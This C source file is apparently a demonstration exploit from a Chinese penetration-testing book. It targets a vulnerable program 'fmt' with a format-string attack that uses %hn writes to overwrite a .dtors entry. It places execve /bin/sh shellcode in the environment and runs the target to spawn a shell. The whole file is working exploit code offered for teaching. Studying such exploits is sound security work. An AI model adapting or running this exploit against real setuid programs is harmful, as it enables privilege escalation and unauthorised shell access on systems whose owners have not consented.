/* exp.c
*
*  《网络渗透技术》演示程序
*  作者：san, alert7, eyas, watercloud
*
*  针对fmt.c的利用程序
*/

#include <stdio.h>
#include <strings.h>
#include <stdlib.h>

#define dtors_addr  0x08049504 + 4
#define VUL         "./fmt"
#define ALIGN       0
#define FLAG        106

char shellcode[]=
"\x31\xd2\x52\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69"
"\x89\xe3\x52\x53\x89\xe1\x8d\x42\x0b\xcd\x80";

void mkfmt(char *fmtstr, u_long retloc, u_long shaddr, int align, int flag)
{
    int i;
    unsigned int valh;
    unsigned int vall;
    unsigned int b0 = (retloc >> 24) & 0xff;
    unsigned int b1 = (retloc >> 16) & 0xff;
    unsigned int b2 = (retloc >>  8) & 0xff;
    unsigned int b3 = (retloc      ) & 0xff;


    /* detailing the value */
    valh = (shaddr >> 16) & 0xffff; //top
    vall = shaddr & 0xffff;         //bottom
/*
    for (i = 0; i < align; i++) {
        *fmtstr++ = 0x41;
    }
*/
    /* let's build */
    if (valh < vall) {
        sprintf(fmtstr,
                "%c%c%c%c"           /* high address */
                "%c%c%c%c"           /* low address */
                "%%%uc"              /* set the value for the first %hn */
                "%%%d$hn"            /* the %hn for the high part */
                "%%%uc"              /* set the value for the second %hn */
                "%%%d$hn"            /* the %hn for the low part */
                ,
                b3+2, b2, b1, b0,    /* high address */
                b3, b2, b1, b0,      /* low address */
                valh-8,              /* set the value for the first %hn */
                flag,                /* the %hn for the high part */
                vall-valh,           /* set the value for the second %hn */
                flag+1               /* the %hn for the low part */
               );
    } else {
        sprintf(fmtstr,
                "%c%c%c%c"           /* high address */
                "%c%c%c%c"           /* low address */
                "%%%uc"              /* set the value for the first %hn */
                "%%%d$hn"            /* the %hn for the high part */
                "%%%uc"              /* set the value for the second %hn */
                "%%%d$hn"            /* the %hn for the low part */
                ,                                                             
                b3+2, b2, b1, b0,    /* high address */
                b3, b2, b1, b0,      /* low address */
                vall-8,              /* set the value for the first %hn */
                flag+1,              /* the %hn for the high part */
                valh-vall,           /* set the value for the second %hn */
                flag                 /* the %hn for the low part */
               );
    }

//*
    for (i = 0; i < align; i++) {
        strcat(fmtstr, "A");
    }
//*/
}

int main(int argc, char *argv[])
{
    int     ret_addr;
    int     align = ALIGN;
    int     flag  = FLAG;
    char    buf[256];
    char    *args[] = {VUL, buf, NULL};
    char    *env[]  = {shellcode, NULL};

    if (argc > 1) align = atoi(argv[1]);
    if (argc > 2) flag  = atoi(argv[2]);

    /* our shellcode address */
    ret_addr = 0xbffffffc - (strlen(shellcode)+1) - (strlen(VUL)+1);

    printf ("Use shellcode 0x%x\n", ret_addr);
        
    memset(buf, 0, sizeof(buf));
    /* build format strings */
    mkfmt (buf, dtors_addr, ret_addr, align, flag);

    execve (args[0], args, env);
    return 0;
}
